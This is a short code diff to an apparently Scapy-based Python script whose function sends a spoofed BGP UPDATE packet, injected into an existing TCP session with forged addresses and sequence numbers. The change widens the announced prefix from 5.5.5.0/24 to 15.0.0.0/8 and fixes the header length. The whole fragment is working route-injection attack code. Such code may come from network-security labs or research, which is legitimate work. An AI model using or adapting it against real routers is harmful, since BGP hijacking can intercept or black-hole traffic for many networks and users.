@@ -82,11 +82,11 @@ def send_update_packet(iface, srcMac, dstMac, srcIP, srcPort, dstIP, dstPort, se
 	# Multiple Exit Discriminator [0000]
 	paMED= BGPPathAttribute(flags = 0x80 , type = 4, attr_len = 4, value = '\x00\x00\x00\x00')
 
-	paBGPU = BGPUpdate(tp_len = 28, total_path = [paORIGIN , paAS , paNEXTHOP, paMED], nlri = [(24 , '5.5.5.0')])
+	paBGPU = BGPUpdate(tp_len = 28, total_path = [paORIGIN , paAS , paNEXTHOP, paMED], nlri = [(8 , '15.0.0.0')])
 
 	spoofed_packet = IP(dst = dstIP, src = srcIP, ttl = 255)/\
 		TCP(dport = dstPort, sport = srcPort, flags = "PA", seq = seqNum, ack = ackNum)/\
-		BGPHeader(len = 55, type = 2)/\
+		BGPHeader(len = 53, type = 2)/\
 		paBGPU
 
 	frame = Ether(src=srcMac, dst=dstMac)/spoofed_packet
